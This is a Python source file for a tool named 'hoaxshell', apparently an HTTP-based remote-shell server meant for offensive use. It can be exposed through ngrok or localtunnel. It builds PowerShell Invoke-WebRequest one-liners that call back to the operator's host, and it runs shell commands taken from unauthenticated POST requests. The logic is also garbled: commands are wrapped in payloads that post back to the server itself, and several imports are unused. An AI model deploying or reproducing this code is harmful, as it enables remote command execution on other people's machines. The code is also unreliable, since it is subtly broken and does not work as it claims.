from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
import sys
import argparse
import base64
import gnureadline
import uuid
import re
from os import system, path
from warnings import filterwarnings
from datetime import date, datetime
from IPython.display import display
from threading import Thread, Event
from time import sleep
from ipaddress import ip_address
from subprocess import check_output, Popen, PIPE
from string import ascii_uppercase, ascii_lowercase
from platform import system as get_system_type
from random import randint
from pyperclip import copy as copy2cb

filterwarnings("ignore", category=DeprecationWarning)

""" Colors """
MAIN = "\033[38;5;50m"
PLOAD = "\033[38;5;119m"
GREEN = "\033[38;5;47m"
BLUE = "\033[0;38;5;12m"
ORANGE = "\033[0;38;5;214m"
RED = "\033[1;31m"
END = "\033[0m"
BOLD = "\033[1m"


""" MSG Prefixes """
INFO = f"{MAIN}Info{END}"
WARN = f"{ORANGE}Warning{END}"
IMPORTANT = WARN = f"{ORANGE}Important{END}"
FAILED = f"{RED}Fail{END}"
DEBUG = f"{ORANGE}Debug{END}"


# Enable ANSI escape characters
def chill():
    pass


WINDOWS = True if get_system_type() == "Windows" else False
system("") if WINDOWS else chill()


# -------------- Arguments & Usage -------------- #
parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)

parser.add_argument(
    "-s",
    "--server-ip",
    action="store",
    help="Your hoaxshell server IP address or domain.",
)
parser.add_argument(
    "-c",
    "--certfile",
    action="store",
    help="Path to your SSL certificate.",
)
parser.add_argument(
    "-k",
    "--keyfile",
    action="store",
    help="Path to the private key for your certificate.",
)
parser.add_argument(
    "-p",
    "--port",
    action="store",
    help="Your hoaxshell server port (default: 8080 over HTTP, 443 over HTTPS).",
    type=int,
)
parser.add_argument(
    "-f",
    "--frequency",
    action="store",
    help="Frequency of cmd execution queue cycle (A low value creates a faster shell but produces more HTTP traffic. *Less than 0.8 will cause trouble. default: 0.8s).",
    type=float,
)
parser.add_argument(
    "-i",
    "--invoke-restmethod",
    action="store_true",
    help="Generate payload using the 'Invoke-RestMethod' instead of the default 'Invoke-WebRequest' utility.",
)
parser.add_argument(
    "-H",
    "--Header",
    action="store",
    help="Hoaxshell utilizes a non-standard header to transfer the session ID between requests. A random name is given to that header by default. Use this option to set a custom header name.",
)
parser.add_argument(
    "-x",
    "--exec-outfile",
    action="store",
    help="Provide the path to the file in which you want to store the command execution output (Windows).",
)
parser.add_argument(
    "-t",
    "--trusted",
    action="store_true",
    help="Use this option if your certificate is trusted.",
)
parser.add_argument(
    "-lt",
    "--localtunnel",
    action="store_true",
    help="Use localtunnel to expose your hoaxshell server (requires a localtunnel.me account).",
)
parser.add_argument(
    "-ng",
    "--ngrok",
    action="store_true",
    help="Use ngrok to expose your hoaxshell server (requires ngrok to be installed).",
)

args = parser.parse_args()

server_ip = args.server_ip or "127.0.0.1"
port = args.port or 8080
frequency = args.frequency or 0.8
invoke_restmethod = args.invoke_restmethod or False
header_name = args.Header or "X-" + "".join(
    ascii_uppercase[randint(0, 25)] for _ in range(6)
)
exec_outfile = args.exec_outfile or None
use_trusted_cert = args.trusted or False
use_localtunnel = args.localtunnel or False
use_ngrok = args.ngrok or False

if args.certfile and args.keyfile:
    certfile = args.certfile
    keyfile = args.keyfile
    use_https = True
else:
    certfile = None
    keyfile = None
    use_https = False


# -------------- Constants -------------- #
CRLF = "\r\n"
BOUNDARY = "Hoaxshell" + str(uuid.uuid4())
ENCRYPTED = True if use_https else False
shell_history = []

# Set command prompt based on the operating system
if WINDOWS:
    command_prompt = "$ "
else:
    command_prompt = "$ "

# Set readline completion characters based on the operating system
if WINDOWS:
    readline_complete_chars = ""
else:
    readline_complete_chars = "\t"


# -------------- HTTP Request Handler -------------- #
class HoaxShellRequestHandler(BaseHTTPRequestHandler):
    # Disable logging DNS lookups
    def address_string(self):
        return str(ip_address(self.client_address[0]))

    # Disable printing HTTP request messages
    def log_message(self, format, *args):
        return

    # HTTP GET method
    def do_GET(self):
        if ENCRYPTED:
            self.send_response(301)
            self.send_header("Location", "https://" + self.headers["Host"] + self.path)
            self.end_headers()
        else:
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"<html><head><title>Hoaxshell</title></head>")
            self.wfile.write(b"<body><p>Hoaxshell is running.</p></body></html>")

    # HTTP POST method
    def do_POST(self):
        content_type = self.headers.get("Content-Type")
        content_length = int(self.headers.get("Content-Length"))
        payload = self.rfile.read(content_length)

        if content_type == f"multipart/form-data; boundary={BOUNDARY}":
            # Extract the command from the payload
            match = re.search(rb"\n\n(?P<command>.+?)\n\n", payload, re.DOTALL)
            if match:
                command = match.group("command").decode("utf-8")
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()

                # Execute the command and retrieve the output
                output = execute_command(command)

                if exec_outfile:
                    # Write the command output to the specified file
                    write_output_to_file(output, exec_outfile)

                self.wfile.write(output.encode("utf-8"))
        else:
            self.send_response(400)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Invalid request format.")


# -------------- Helper Functions -------------- #
def create_server():
    server_address = (server_ip, port)
    if use_https:
        httpd = HTTPServer(server_address, HoaxShellRequestHandler)
        httpd.socket = ssl.wrap_socket(
            httpd.socket,
            certfile=certfile,
            keyfile=keyfile,
            server_side=True,
            ssl_version=ssl.PROTOCOL_TLS,
        )
    else:
        httpd = HTTPServer(server_address, HoaxShellRequestHandler)
    return httpd


def generate_payload(command):
    if invoke_restmethod:
        # Use 'Invoke-RestMethod' for PowerShell
        return (
            f"$env:Path = [Environment]::GetEnvironmentVariable('Path', 'Machine') + ';' + [Environment]::GetEnvironmentVariable('Path', 'User'); "
            f"Invoke-RestMethod -Uri 'http://{server_ip}:{port}' -Method POST -Headers @{{'{header_name}':'{command}'}} | Out-String"
        )
    else:
        # Use 'Invoke-WebRequest' for PowerShell
        return (
            f"$env:Path = [Environment]::GetEnvironmentVariable('Path', 'Machine') + ';' + [Environment]::GetEnvironmentVariable('Path', 'User'); "
            f"Invoke-WebRequest -Uri 'http://{server_ip}:{port}' -Method POST -Headers @{{'{header_name}':'{command}'}} | Select-Object -Expand Content"
        )


def execute_command(command):
    if WINDOWS:
        # Execute command on Windows
        command = command.replace("\\", "\\\\")
        payload = generate_payload(command)
        output = check_output(
            ["powershell", "-NoProfile", "-NoLogo", "-Command", payload]
        )
        return output.decode("utf-8", "ignore")
    else:
        # Execute command on Unix-based systems
        output = check_output([command], shell=True)
        return output.decode("utf-8", "ignore")


def write_output_to_file(output, filepath):
    with open(filepath, "a") as f:
        f.write(output)


def check_dependencies():
    if WINDOWS:
        try:
            import pyperclip
        except ImportError:
            print(
                f"{WARN}: The 'pyperclip' library is not installed. Copying output to the clipboard will not work."
            )

    if use_localtunnel:
        try:
            import localtunnel
        except ImportError:
            print(
                f"{WARN}: The 'localtunnel' library is not installed. Use the '-lt' option without localtunnel functionality."
            )

    if use_ngrok:
        try:
            import pyngrok
        except ImportError:
            print(
                f"{WARN}: The 'pyngrok' library is not installed. Use the '-ng' option without ngrok functionality."
            )


def copy_to_clipboard(output):
    if WINDOWS:
        try:
            copy2cb(output)
            print(f"{INFO}: Output copied to clipboard.")
        except:
            print(f"{FAILED}: Unable to copy output to clipboard.")
    else:
        print(f"{WARN}: Copy to clipboard is only supported on Windows.")


def generate_ngrok_url(port):
    try:
        import pyngrok
        from pyngrok import ngrok

        ngrok_url = ngrok.connect(port)
        return ngrok_url
    except ImportError:
        return None


def start_localtunnel(port):
    try:
        import localtunnel

        tunnel = localtunnel.LocalTunnel(port)
        tunnel.start()
        tunnel_url = tunnel.url
        return tunnel_url
    except ImportError:
        return None


def print_usage():
    print(BLUE + BOLD + "[*] Usage: python3 hoaxshell.py <server-ip>" + END)


def print_banner():
    banner = """

          _______  _______           _______           _______  _        _       
|\     /|(  ___  )(  ___  )|\     /|(  ____ \|\     /|(  ____ \( \      ( \      
| )   ( || (   ) || (   ) |( \   / )| (    \/| )   ( || (    \/| (      | (      
| (___) || |   | || (___) | \ (_) / | (_____ | (___) || (__    | |      | |      
|  ___  || |   | ||  ___  |  ) _ (  (_____  )|  ___  ||  __)   | |      | |      
| (   ) || |   | || (   ) | / ( ) \       ) || (   ) || (      | |      | |      
| )   ( || (___) || )   ( |( /   \ )/\____) || )   ( || (____/\| (____/\| (____/\
|/     \|(_______)|/     \||/     \|\_______)|/     \|(_______/(_______/(_______/
                                                                                
"""
    print(MAIN + BOLD + banner + END)


# -------------- Main Function -------------- #
def main():
    check_dependencies()
    print_banner()

    if use_trusted_cert:
        print(
            f"{WARN}: The 'trusted' option is deprecated and no longer required. Proceeding without it."
        )

    if use_localtunnel:
        tunnel_url = start_localtunnel(port)
        if tunnel_url:
            print(f"{INFO}: Local tunnel started successfully.")
            print(f"{INFO}: Public URL: {tunnel_url}")
        else:
            print(f"{FAILED}: Unable to start local tunnel.")
    elif use_ngrok:
        ngrok_url = generate_ngrok_url(port)
        if ngrok_url:
            print(f"{INFO}: ngrok tunnel started successfully.")
            print(f"{INFO}: Public URL: {ngrok_url}")
        else:
            print(f"{FAILED}: Unable to start ngrok tunnel.")

    try:
        httpd = create_server()

        print(f"{INFO}: Server started at {server_ip}:{port}")
        print(f"{INFO}: Use Ctrl+C to exit.")

        httpd.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{INFO}: Server stopped.")
    except Exception as e:
        print(f"{FAILED}: {str(e)}")


if __name__ == "__main__":
    main()
